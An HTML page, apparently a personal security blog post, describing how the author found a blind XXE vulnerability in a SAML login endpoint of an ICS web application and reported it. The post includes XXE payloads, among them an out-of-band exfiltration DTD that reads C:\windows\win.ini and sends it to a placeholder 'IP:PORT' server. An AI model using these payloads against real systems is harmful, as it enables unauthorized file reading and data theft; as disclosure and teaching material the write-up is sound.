@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="https://momo1239.github.io/2024/cve-2024/" />
+  <link rel="next" href="https://momo1239.github.io/2024/mobile-cert/" />
+  <link rel="canonical" href="https://momo1239.github.io/2024/xxe_writeup/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+
+  <title>
+       
+       
+           Discovering a Blind XXE in an ICS Web App | Kenny Nguyen (momo)
+       
+  </title>
+  <meta name="title" content="Discovering a Blind XXE in an ICS Web App | Kenny Nguyen (momo)">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Discovering a Blind XXE in an ICS Web App"/>
+<meta name="twitter:description" content="Public Security Research: XML External Entities Vulnerability Discovery Recently, I did some public security research and discovered a critical security vulnerability in a login portal. The login portal was using SAML protocol for SSO authentication with a vulnerable XML parser in the backend. This allows for an attacker (or researcher like me) to exploit an XXE and perform sensitive file read on the server. In this writeup, I&rsquo;ll be discussing my methodology and how I discovered this vulnerability."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Discovering a Blind XXE in an ICS Web App",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/momo1239.github.io\/2024\/xxe_writeup\/"
+  },
+  
+  "genre": "posts",
+  "keywords": "vuln-research, web-hacking, bug-bounty",
+  "wordcount":  667 ,
+  "url": "https:\/\/momo1239.github.io\/2024\/xxe_writeup\/",
+  "datePublished": "2024-06-03T00:00:00\u002b00:00",
+  "dateModified": "2024-06-03T00:00:00\u002b00:00",
+  
+  
+  
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="https://momo1239.github.io/">Kenny Nguyen (momo)</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="https://momo1239.github.io/">Kenny Nguyen (momo)</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">Discovering a Blind XXE in an ICS Web App</h1>
+        <div class="post-meta">
+            Written by <a href="https://momo1239.github.io/" rel="author">Momo</a> with ♥
+                <span class="post-time">
+                    on <time datetime=2024-06-03 >3 June 2024</time>
+                </span>
+                in
+                
+                &nbsp;<i class="iconfont icon-timer"></i>
+                4 min
+        </div>
+    </header>
+    <div class="post-content">
+
+        
+
+
+        
+
+        
+            
+        
+
+        
+        
+
+          
+          
+          
+
+          
+          
+          
+
+          <h1 id="public-security-research-xml-external-entities-vulnerability-discovery">Public Security Research: XML External Entities Vulnerability Discovery</h1>
+<p>Recently, I did some public security research and discovered a critical security vulnerability in a login portal. The login portal was using SAML protocol for SSO authentication with a vulnerable XML parser in the backend. This allows for an attacker (or researcher like me) to exploit an XXE and perform sensitive file read on the server. In this writeup, I&rsquo;ll be discussing my methodology and how I discovered this vulnerability.</p>
+<h2 id="the-target">The Target</h2>
+<p>When conducting security research on a web application target, recon and enumeration is one of the first and most important thing that you&rsquo;ll do. While I was fuzzing the main domain&rsquo;s directories and files, I came across an endpoint that was returning an HTTP 500 error called logout.aspx. This gave me several key information. I knew that the web server was running on windows and the application is running ASP.NET framework.</p>
+<p>When I&rsquo;m on an endpoint, I like to use the features and functionality of the app to try to understand what the application is doing. This logout.aspx endpoint was returning an error with verbose error message in the response. When taking a look at the source code it seems like the endpoint was taking some parameters in a POST request when a user is logging on. Those two parameters with SAMLRequest and SAMLResponse.</p>
+<h2 id="the-vulnerability">The vulnerability</h2>
+<p>The SAMLResponse parameter when captured with a proxy had a base64 url encoded XML string to send via SAML in the backend for authentication purposes. If the backend XML parser is not properly sanitizing inputs or hardened then an attacker could manipulate the parameters with malicious XML.</p>
+<p>I tested for this by encoding a basic XML payload:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY % asd SYSTEM &#34;http://evilhost&#34;&gt; %asd;]&gt;
+</code></pre><p>When I sent that POST request, the server responsed saying that it could not resolve remote host named http://evilhost. This means that the XML parser is executing our code.</p>
+<p>I modified the payload with my own web server and on my server log got a ping back from the vulnerable web server. At this point, I knew this portal was vulnerable to an XXE attack.</p>
+<h2 id="sensitive-file-read">Sensitive File Read</h2>
+<p>Now that I had identified a vulnerability, I wanted to demonstrate some impact. I was not able to read a file and have the contents returned to me in the server&rsquo;s response. This makes the XXE a blind XXE vulnerability. So, how can we escalate to achieve file read?</p>
+<h3 id="xxe-oob-exfiltration">XXE OOB Exfiltration</h3>
+<p>One thing we can do is to perform an out of band data exfiltration.</p>
+<p>Out of band exfiltration is a technique where an attacker uses an external, often secondary channel to exfiltrate data. Instead of directly returning the data in the application&rsquo;s response (in band), the attacker causes the application to send the data to an external server they control.</p>
+<p>We can host an XML document that defines an external entity to retrieve the contents of a file and send it to our web server. In my case, I created a dtd file with the following payload:</p>
+<pre tabindex="0"><code>&lt;!ENTITY % file SYSTEM &#34;file:///C:\windows\win.ini&#34;&gt;
+&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://IP:PORT/?data=%file;&#39;&gt;&#34;&gt;
+%eval;
+%exfil;
+</code></pre><p>Now, to trigger the vulnerability I will send in a POST request with the following payload url and base64 encoded:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % asd SYSTEM &#34;http://IP:PORT/test.dtd&#34;&gt;%asd;]&gt;&lt;foo&gt;&amp;send;&lt;/foo&gt;
+</code></pre><p>In the first part, when we send this payload, the xml parser will process the payload to hit our dtd file. Then the xml parser will process the external dtd file that I created which will instruct it to fetch C:\windows\win.ini and send it back to my web server. The end result will have the file contents of the file encoded in our web server&rsquo;s log and we can easily decode to read the file contents.</p>
+<p><img src="/images/xxe_results.png" alt="File Contents Retrieved"></p>
+<p>Thank you for reading this short writeup on discovering a Blind XXE on a public web application. I have reported this vulnerability to the proper authorities and they have now implemented security measures against this attack!</p>
+
+    </div>
+
+    <div class="post-copyright">
+        <div class="author">
+            <figure class="author-image">
+                <a href="/about" class="image" alt="MomoDawg">
+                <span class="hidden">About Momo</span></a>
+            </figure>
+        </div>
+
+        <p class="copyright-item">
+            
+            <h4>Share This Post:</h4>
+            <span class="share-icons">
+
+      
+
+      
+
+      
+
+      
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fmomo1239.github.io%2f2024%2fxxe_writeup%2f&amp;title=Discovering%20a%20Blind%20XXE%20in%20an%20ICS%20Web%20App" target="_blank" title="Share on LinkedIn">
+          <i class="iconfont icon-linkedin"></i>
+        </a>&nbsp;
+        
+
+      
+
+      
+
+      
+
+          
+
+          
+
+          
+
+          
+</span>
+        </p>
+                    
+
+        
+    </div>
+
+
+    <div class="post-tags">
+        
+        <section>
+            <i class="iconfont icon-icon-tag"></i>
+            
+            &nbsp;&nbsp;<span class="tag"><a href="https://momo1239.github.io/tags/vuln-research/">vuln-research</a></span>
+            
+            &nbsp;&nbsp;<span class="tag"><a href="https://momo1239.github.io/tags/web-hacking/">web-hacking</a></span>
+            
+            &nbsp;&nbsp;<span class="tag"><a href="https://momo1239.github.io/tags/bug-bounty/">bug-bounty</a></span>
+            
+        </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> ·
+                <span><a href="https://momo1239.github.io/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://momo1239.github.io/2024/cve-2024/" class="prev" rel="prev" title="Lame ZeroDay Research: Stack Based Buffer Overflow in CVE-2024-XYZA"><i class="iconfont icon-dajiantou"></i>&nbsp;Lame ZeroDay Research: Stack Based Buffer Overflow in CVE-2024-XYZA</a>
+        
+        
+        <a href="https://momo1239.github.io/2024/mobile-cert/" class="next" rel="next" title="Review of Mobile App Pentesting Certifications">Review of Mobile App Pentesting Certifications&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+          
+  
+
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="footer-social"> Get in touch: 
+<a href="https://github.com/momo1239" target="_blank" rel="me noopener noreferrer"><i class="iconfont icon-github"></i></a>
+
+
+<a href="https://linkedin.com/in/kenny-nguyen-2a3022152" target="_blank" rel="me noopener noreferrer"><i class="iconfont icon-linkedin"></i></a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ </div>
+    <div class="copyright" itemscope>
+        &copy;
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://momo1239.github.io/">Momo</a> | </span>
+         
+
+          <span>🛠️ with <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hugo</a> | Based on <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreferrer">KeepIt</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">
+     
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
